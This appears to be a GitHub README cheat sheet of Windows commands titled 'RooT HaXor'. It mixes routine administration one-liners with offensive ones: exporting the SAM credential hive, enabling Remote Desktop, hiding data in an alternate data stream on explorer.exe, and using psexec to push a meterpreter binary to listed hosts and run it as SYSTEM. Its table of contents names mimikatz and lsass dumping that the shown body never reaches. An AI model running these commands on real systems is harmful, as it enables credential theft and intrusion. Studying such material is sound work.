#RooT HaXor
Bang!! Bang!!

<h2><a id="user-content-table-of-contents" class="anchor" href="#table-of-contents" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Table of Contents</h2>

<ul>
<li><a href="#get-entires-from-ipv4-neighbor-cache">Get entires from IPv4 neighbor cache</a></li>
<li><a href="#get-available-wireless-networks-via-cmd-and-netsh">Get available wireless networks via cmd and netsh</a></li>
<li><a href="#quick-list-ip-addresses-only">Quick list IP addresses only</a></li>
<li><a href="#list-all-services-and-their-binaries">List ALL services AND their binaries</a></li>
<li><a href="#export-sam-from-the-windows-registry-to-a-file">Export SAM from the Windows Registry to a file</a></li>
<li><a href="#enable-remote-desktop-using-reg">Enable remote desktop using reg</a></li>
<li><a href="#enable-the-boot-log-to-see-list-of-drivers-loaded-during-startup">Enable the boot log to see list of drivers loaded during startup</a></li>
<li><a href="#powershell-cmdlet-to-create-system-restore-point">Powershell cmdlet to create System Restore Point</a></li>
<li><a href="#check-the-current-account-for-sedebugprivilege">Check the current account for seDebugPrivilege</a></li>
<li><a href="#enabledisable-system-users-via-command-line">Enable/disable system users via command line</a></li>
<li><a href="#view-process-that-is-consuming-the-most-memory-using-powershell">View process that is consuming the most memory using powershell</a></li>
<li><a href="#create-an-alternate-data-stream-from-a-file-on-an-ntfs-partition">Create an Alternate Data Stream from a file on an NTFS partition</a></li>
<li><a href="#export-running-processes-in-csv-format">Export running processes in CSV format</a></li>
<li><a href="#lock-windows-desktop-using-command-line">Lock Windows desktop using command line</a></li>
<li><a href="#start-explorer-with-a-file-or-folder-selectedhighlighted">Start explorer with a file or folder selected/highlighted</a></li>
<li><a href="#dump-virtualbox-image-containing-ram-and-elf-headers">Dump VirtualBox image containing RAM and ELF headers</a></li>
<li><a href="#set-time-zone-of-the-system-clock">Set Time Zone of the system clock</a></li>
<li><a href="#make-folder-inside-a-guest-from-the-host">Make folder inside a guest from the host</a></li>
<li><a href="#force-copy-meterpreter-binary-to-remote-machines--run-as-system">Force copy meterpreter binary to remote machines &amp; run as system</a></li>
<li><a href="#create-nw-share-called-apps-with-read-access--limit-to-10-conns">Create n/w share called <code>Apps</code>, with read access &amp; limit to 10 conns</a></li>
<li><a href="#list-all-the-drives-under-my-computer-using-fsutil">List all the drives under My Computer using fsutil</a></li>
<li><a href="#troubleshoot-nw-packet-drops-with-router-statistics-using-pathping">Troubleshoot n/w packet drops with router statistics using pathping</a></li>
<li><a href="#list-unsigned-dlls-for-a-specific-process">List unsigned dlls for a specific process. For system wide list</a></li>
<li><a href="#obtain-a-list-of-windows-xp-computers-on-the-domain-using-ps">Obtain a list of Windows XP computers on the domain using PS</a></li>
<li><a href="#open-the-system-properties-window-with-the-advanced-tab-selected">Open the System Properties window, with the <code>Advanced</code> tab selected</a></li>
<li><a href="#using-the-dir-command-to-find-alternate-data-streams">Using the <code>dir</code> command to find Alternate Data Streams</a></li>
<li><a href="#use-procdump-to-obtain-the-lsass-process-memory">Use <code>procdump</code> to obtain the <code>lsass</code> process memory</a></li>
<li><a href="#run-mimikatz-in-minidump-mode--use-minidmp-from-procdump">Run <code>mimikatz</code> in <code>minidump</code> mode &amp; use <code>mini.dmp</code> from <code>procdump</code></a></li>
<li><a href="#get-list-of-startup-programs-using-wmic">Get list of startup programs using wmic</a></li>
<li><a href="#add-a-binary-to-an-alternate-data-stream">Add a binary to an Alternate Data Stream</a></li>
<li><a href="#execute-a-binary-alternate-data-stream-win-72008-using-wmic">Execute a binary Alternate Data Stream Win 7/2008 using wmic</a></li>
<li><a href="#show-config--state-info-for-network-access-protection-enabled-client">Show config &amp; state info for Network Access Protection enabled client</a></li>
<li><a href="#get-computer-system-information-including-domain-name-and-memory-using-wmic">Get computer system information, including domain name and memory, using wmic</a></li>
<li><a href="#use-the-package-manager-in-windows-to-install-the-telnet-client-on-windows-vista--higher">Use the Package Manager in Windows to install the Telnet client on Windows Vista &amp; higher</a></li>
<li><a href="#secure-delete-a-filefolder-in-windows">Secure delete a file/folder in Windows</a></li>
<li><a href="#show-all-startup-entries-while-hiding-microsoft-entries-csv-output">Show all startup entries while hiding Microsoft entries. CSV output</a></li>
<li><a href="#download-files-via-commandline-using-ps">Download files via commandline using PS</a></li>
<li><a href="#fetch-the-last-10-entries-from-the-windows-security-event-log-in-text-format">Fetch the last 10 entries from the Windows Security event log, in text format</a></li>
<li><a href="#create-a-dll-that-runs-calc-on-invoke">Create a dll that runs calc on invoke</a></li>
<li><a href="#run-a-command-as-another-user">Run a command as another user</a></li>
<li><a href="#get-shutdownreboot-events-from-the-last-1000-log-entries-using-ps">Get shutdown/reboot events from the last 1000 log entries using PS</a></li>
<li><a href="#create-a-new-snapshot-of-the-volume-that-has-the-ad-database-and-log-files">Create a new snapshot of the volume that has the AD database and log files</a></li>
<li><a href="#mount-the-snapshot">Mount the snapshot</a></li>
<li><a href="#run-a-process-on-a-remote-system-using-wmic">Run a process on a remote system using wmic</a></li>
<li><a href="#list-the-machines-with-usernames-that-were-connected-via-rdp">List the machines, with usernames, that were connected via RDP</a></li>
<li><a href="#list-all-process-that-are-running-on-your-system-by-remote-users-connected-via-rdp">List all process that are running on your system by remote users connected via RDP</a></li>
<li><a href="#reset-the-windows-tcpip-stack">Reset the Windows TCP\IP stack</a></li>
<li><a href="#list-logged-on-users">List logged on users</a></li>
<li><a href="#set-a-static-ip-on-a-remote-box">Set a static IP on a remote box</a></li>
<li><a href="#bypass-powershell-execution-policy-restrictions">Bypass powershell execution policy restrictions</a></li>
<li><a href="#list-running-processes-every-second-on-a-remote-box">List running processes every second on a remote box</a></li>
<li><a href="#get-a-list-of-running-processes-and-their-command-line-arguments-on-a-remote-system">Get a list of running processes and their command line arguments on a remote system</a></li>
<li><a href="#remotely-enable-and-start-the-volume-shadow-copy-service">Remotely enable and start the Volume Shadow Copy Service</a></li>
<li><a href="#ping-multiple-ips-from-ipstxt--see-live-hosts">Ping multiple IPs from <code>ips.txt</code> &amp; see live hosts</a></li>
<li><a href="#set-global-proxy-in-windows-to-point-to-ie-proxy">Set global proxy in Windows to point to IE proxy</a></li>
<li><a href="#enumerate-list-of-drivers-with-complete-path-information">Enumerate list of drivers with complete path information</a></li>
<li><a href="#view-group-policy-objects-that-have-been-applied-to-a-system">View Group Policy Objects that have been applied to a system</a></li>
<li><a href="#reset-the-wmi-repository-to-what-it-was-when-the-os-was-installed">Reset the WMI repository to what it was when the OS was installed</a></li>
<li><a href="#create-symbolic-links-in-windows-vista-7--higher">Create symbolic links in Windows Vista, 7 &amp; higher</a></li>
<li><a href="#enable-the-tftp-client-in-vista--higher">Enable the tftp client in Vista &amp; higher</a></li>
<li><a href="#obtain-list-of-firewall-rules-on-a-local-system">Obtain list of firewall rules on a local system</a></li>
<li><a href="#get-name-of-current-domain-controller">Get name of current domain controller</a></li>
<li><a href="#look-at-content-cached-in-kernel-mode-on-iis-7-and-higher">Look at content cached in kernel mode on IIS 7 and higher</a></li>
<li><a href="#quick-test-to-check-ms15_034">Quick test to check <code>MS15_034</code></a></li>
<li><a href="#get-a-list-of-all-open-named-pipes-via-powershell">Get a list of all open Named pipes via Powershell</a></li>
<li><a href="#possible-venom-detection-on-virtualbox">Possible <code>VENOM</code> detection on VirtualBox</a></li>
<li><a href="#list-rdp-sessions-on-local-or-remote-in-list-format">List RDP sessions on local or remote in list format</a></li>
<li><a href="#get-a-list-of-service-packs--hotfixes-using-wmic-for-remote-systems-listed-in-file">Get a list of service packs &amp; hotfixes using wmic for remote systems listed in file</a></li>
<li><a href="#export-wireless-connection-profiles">Export wireless connection profiles</a></li>
<li><a href="#unzip-using-powershell">Unzip using PowerShell</a></li>
<li><a href="#open-the-network--sharing-center">Open the Network &amp; Sharing center</a></li>
<li><a href="#remotely-stopstart-ftp-on-several-systems">Remotely stop/start ftp on several systems</a></li>
<li><a href="#to-quickly-find-large-files-using-cmd">To quickly find large files using cmd</a></li>
<li><a href="#print-rdp-connections">Print RDP connections</a></li>
<li><a href="#list-scheduled-tasks--binaries">List scheduled tasks &amp; binaries</a></li>
<li><a href="#display-the-stored-user-names-and-passwords-window">Display the "Stored User names and Passwords" window</a></li>
<li><a href="#list-namespaces--classes-in-wmi-via-powershell">List namespaces &amp; classes in WMI via PowerShell</a></li>
<li><a href="#convert-between-vdi-vmdk-vhd-raw-disk-images-using-virtualbox">Convert Between VDI, VMDK, VHD, RAW disk images using VirtualBox</a></li>
<li><a href="#change-file-extensions-recurseively">Change file extensions recurseively</a></li>
<li><a href="#list-ips-of-running-virtualbox-machines">List IPs of running VirtualBox machines</a></li>
<li><a href="#enumerate-packages-with-their-oem-inf-filenames">Enumerate packages with their oem inf filenames</a></li>
<li><a href="#install-a-driver-package-using-inf-file">Install a driver package using inf file</a></li>
<li><a href="#malware-hunting-with-mark-russinovich-and-the-sysinternals">Malware Hunting with Mark Russinovich and the Sysinternals</a></li>
<li><a href="#windows-nano-server-apis">Windows Nano Server APIs</a></li>
<li><a href="#windows-wifi-hotspot-using-cmd">Windows wifi hotspot using cmd</a></li>
<li><a href="#disable-uac-via-cmdline">Disable UAC via cmdline</a></li>
<li><a href="#turn-off-windows-firewall-for-all-profiles">Turn off Windows firewall for all profiles</a></li>
<li><a href="#list-missing-updates">List Missing Updates</a></li>
<li><a href="#export-sam-and-system-dump-password-hashes-offline">Export SAM and SYSTEM. Dump password hashes offline</a></li>
<li><a href="#convert-binary-to-base64-string-to-transfer-across-restricted-rdp">Convert Binary to base64 string to transfer across restricted RDP</a></li>
<li><a href="#convert-base64-string-to-binary">Convert Base64 string to Binary</a></li>
<li><a href="#list-services-running-as-system-and-possibly-weak-file-permissions">List services running as SYSTEM and possibly weak file permissions</a></li>
<li><a href="#check-bitlocker-status-on-a-remote-box">Check Bitlocker status on a remote box</a></li>
<li><a href="#export-failed-logon-attempts">Export failed logon attempts</a></li>
<li><a href="#alternate-data-streams-and-ps">Alternate Data Streams and PS</a></li>
<li><a href="#run-the-windows-assessment-tool-for-cpu-and-ram-and-disk">Run the Windows Assessment tool for cpu and ram and disk</a></li>
<li><a href="#port-forward-proxy-traffic-to-remote-host-and-port">Port forward (proxy) traffic to remote host and port</a></li>
<li><a href="#enabledisable-netbios-over-tcpip">Enable/Disable NetBIOS over TCP/IP</a></li>
</ul>

<hr>

<h3><a id="user-content-get-entires-from-ipv4-neighbor-cache" class="anchor" href="#get-entires-from-ipv4-neighbor-cache" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get entires from IPv4 neighbor cache</h3>

<pre><code>C:\&gt;netsh interface ipv4 show neighbors
</code></pre>

<h3><a id="user-content-get-available-wireless-networks-via-cmd-and-netsh" class="anchor" href="#get-available-wireless-networks-via-cmd-and-netsh" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get available wireless networks via cmd and netsh</h3>

<pre><code>C:\&gt;netsh wlan show networks mode=b
</code></pre>

<h3><a id="user-content-quick-list-ip-addresses-only" class="anchor" href="#quick-list-ip-addresses-only" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Quick list IP addresses only</h3>

<p>Save the following in <code>ip.bat</code> in <code>%PATH%</code></p>

<pre><code>C:\&gt;ipconfig | find /I "pv"
</code></pre>

<p>Call <code>ip</code> from CLI</p>

<h3><a id="user-content-list-all-services-and-their-binaries" class="anchor" href="#list-all-services-and-their-binaries" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List ALL services AND their binaries</h3>

<pre><code>for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j
</code></pre>

<h3><a id="user-content-export-sam-from-the-windows-registry-to-a-file" class="anchor" href="#export-sam-from-the-windows-registry-to-a-file" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Export SAM from the Windows Registry to a file</h3>

<pre><code>C:\&gt;reg save HKLM\SAM C:\Windows\Temp\SAM
</code></pre>

<h3><a id="user-content-enable-remote-desktop-using-reg" class="anchor" href="#enable-remote-desktop-using-reg" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable remote desktop using reg</h3>

<pre><code>reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
</code></pre>

<h3><a id="user-content-enable-the-boot-log-to-see-list-of-drivers-loaded-during-startup" class="anchor" href="#enable-the-boot-log-to-see-list-of-drivers-loaded-during-startup" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable the boot log to see list of drivers loaded during startup</h3>

<pre><code>bcdedit /set bootlog yes
</code></pre>

<p>Read via <code>%windir%\ntbtlog.txt</code></p>

<h3><a id="user-content-powershell-cmdlet-to-create-system-restore-point" class="anchor" href="#powershell-cmdlet-to-create-system-restore-point" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Powershell cmdlet to create System Restore Point</h3>

<pre><code>PS C:\&gt;Checkpoint-Computer -description "Restore point!"
</code></pre>

<h3><a id="user-content-check-the-current-account-for-sedebugprivilege" class="anchor" href="#check-the-current-account-for-sedebugprivilege" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check the current account for seDebugPrivilege</h3>

<pre><code>C:\&gt; whoami /priv | findstr "Debug"
</code></pre>

<p>For all privs:</p>

<pre><code>C:\&gt; whoami /priv
</code></pre>

<h3><a id="user-content-enabledisable-system-users-via-command-line" class="anchor" href="#enabledisable-system-users-via-command-line" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable/disable system users via command line</h3>

<pre><code>C:\&gt;net user test /active:yes (no)
</code></pre>

<p>Get full help on the net user command:</p>

<pre><code>C:\&gt;net help user
</code></pre>

<h3><a id="user-content-view-process-that-is-consuming-the-most-memory-using-powershell" class="anchor" href="#view-process-that-is-consuming-the-most-memory-using-powershell" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>View process that is consuming the most memory using powershell</h3>

<pre><code>PS C:\&gt; (Get-Process | Sort-Object -Descending WS)[0]
</code></pre>

<h3><a id="user-content-create-an-alternate-data-stream-from-a-file-on-an-ntfs-partition" class="anchor" href="#create-an-alternate-data-stream-from-a-file-on-an-ntfs-partition" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create an Alternate Data Stream from a file on an NTFS partition</h3>

<pre><code>C:\&gt;type data.txt &gt; C:\windows\explorer.exe:newads.txt
</code></pre>

<h3><a id="user-content-export-running-processes-in-csv-format" class="anchor" href="#export-running-processes-in-csv-format" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Export running processes in CSV format</h3>

<pre><code>C:\&gt; tasklist /FO CSV &gt; tasks.txt
</code></pre>

<h3><a id="user-content-lock-windows-desktop-using-command-line" class="anchor" href="#lock-windows-desktop-using-command-line" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Lock Windows desktop using command line</h3>

<pre><code>C:\&gt; rundll32 user32.dll,LockWorkStation
</code></pre>

<h3><a id="user-content-start-explorer-with-a-file-or-folder-selectedhighlighted" class="anchor" href="#start-explorer-with-a-file-or-folder-selectedhighlighted" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Start explorer with a file or folder selected/highlighted</h3>

<pre><code>C:\&gt; explorer /select,C:\MyData\sample.docx
</code></pre>

<h3><a id="user-content-dump-virtualbox-image-containing-ram-and-elf-headers" class="anchor" href="#dump-virtualbox-image-containing-ram-and-elf-headers" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Dump VirtualBox image containing RAM and ELF headers</h3>

<pre><code>C:\&gt;vboxmanage debugvm "WinXPLab1" dumpguestcore --filename winxplab1.elf
</code></pre>

<h3><a id="user-content-set-time-zone-of-the-system-clock" class="anchor" href="#set-time-zone-of-the-system-clock" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Set Time Zone of the system clock</h3>

<pre><code>C:\&gt; tzutil /s "Eastern Standard Time"
</code></pre>

<p>List available Time zones:</p>

<pre><code>C:\&gt; tzutil /l
</code></pre>

<h3><a id="user-content-make-folder-inside-a-guest-from-the-host" class="anchor" href="#make-folder-inside-a-guest-from-the-host" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Make folder inside a guest from the host</h3>

<p><strong>VirtualBox</strong></p>

<pre><code>C:\&gt; vboxmanage guestcontrol "WinXP" md "C:\\test" --username "user" --password "pass"
</code></pre>

<h3><a id="user-content-force-copy-meterpreter-binary-to-remote-machines--run-as-system" class="anchor" href="#force-copy-meterpreter-binary-to-remote-machines--run-as-system" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Force copy meterpreter binary to remote machines &amp; run as system</h3>

<pre><code>C:\&gt; psexec @$ips.txt -s -u adminuser -p pass -f -c \exploits\mp.exe
</code></pre>

